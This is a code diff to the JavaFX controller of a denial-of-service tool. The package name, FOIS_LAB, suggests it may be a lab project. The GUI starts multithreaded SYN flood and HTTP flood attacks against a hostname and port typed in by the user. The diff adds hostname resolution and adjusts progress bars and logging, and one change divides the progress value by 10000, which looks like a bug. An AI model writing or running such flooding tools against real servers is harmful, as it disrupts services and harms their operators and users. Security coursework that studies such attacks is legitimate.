@@ -1,8 +1,3 @@
-/*
- * To change this license header, choose License Headers in Project Properties.
- * To change this template file, choose Tools | Templates
- * and open the template in the editor.
- */
 package fxml.pkg1;
 
 import java.io.*;
@@ -13,6 +8,7 @@ import java.time.LocalDateTime;
 import java.util.ResourceBundle;
 
 import FOIS_LAB.HTTPFlooder;
+import FOIS_LAB.HelperFunctions;
 import FOIS_LAB.SYNFlooder;
 import javafx.event.ActionEvent;
 import java.net.MalformedURLException;
@@ -149,7 +145,7 @@ public class MainAppFXMLController implements Initializable {
                 if (intChecker(port.getText())&&intChecker(threads.getText())){
                     if (synflood.isSelected()){
                         output.appendText("["+dtf.format(now)+"]"+ "Starting SYN flood Attack..."+'\n');
-                        gifloader();
+//                        gifloader();
                         makeProgress();
                         new Thread(()-> {
 
@@ -164,7 +160,7 @@ public class MainAppFXMLController implements Initializable {
                     } else {
                         output.appendText("["+dtf.format(now)+"]"+ "Starting HTTP flood Attack..."+'\n');
 //                        gifloader();
-//                        makeProgress();
+                        makeProgress();
                         new Thread(()-> {
                             try {
                                 flooderThread();
@@ -272,10 +268,9 @@ public class MainAppFXMLController implements Initializable {
         progress.setVisible(true);
         new Thread(()->{
             for(int i=0;i<=100;i++){
-            
                 final int prg = i;
                 Platform.runLater(()->{
-                    progress.setProgress(prg/100.0);
+                    progress.setProgress(prg/10000.0);
                 });
                 Platform.runLater(new Runnable() {
                     @Override
@@ -290,7 +285,7 @@ public class MainAppFXMLController implements Initializable {
                     }
                 });
                 try{
-//                    Thread.sleep(100);
+                    Thread.sleep(100);
                 }catch(Exception e){
                     
                 }
@@ -342,18 +337,18 @@ public class MainAppFXMLController implements Initializable {
 
     public void flooderThread() throws IOException, InterruptedException {
         for (int i = 0; i < Integer.parseInt(threads.getText()); i++){
-            fdr = new HTTPFlooder(hostname.getText(), port.getText(), "tasks/api_create");
+            fdr = new HTTPFlooder(HelperFunctions.resolver(HelperFunctions.schemeRemover(hostname.getText())), port.getText(), "tasks/api_create");
             fdr.jsonFlood();
             fdr.start();
-            if(fdr.getConn().getResponseMessage()!=null) output.appendText("Thread "+fdr.getName()+" "+fdr.getConn(). getResponseCode()+ " "+fdr.getConn().getResponseMessage()+"\n");
+            if(fdr.getConn().getResponseMessage()!=null) output.appendText(fdr.getName()+" "+fdr.getConn(). getResponseCode()+ " "+fdr.getConn().getResponseMessage()+"\n");
 
         }
     }
     public void flooder2Thread() throws IOException{
         for (int i = 0; i < Integer.parseInt(threads.getText()); i++){
-            sdr = new SYNFlooder(hostname.getText(),Integer.parseInt(port.getText()));
+            sdr = new SYNFlooder(HelperFunctions.resolver(HelperFunctions.schemeRemover(hostname.getText())),Integer.parseInt(port.getText()));
             sdr.start();
-            output.appendText("Thread "+i+" "+sdr.getSocket().isConnected()+ " "+sdr.getSocket().getInetAddress()+"\n");
+            output.appendText(sdr.getName()+" "+sdr.getSocket().isConnected()+ " "+sdr.getSocket().getInetAddress()+"\n");
         }
     }
 }
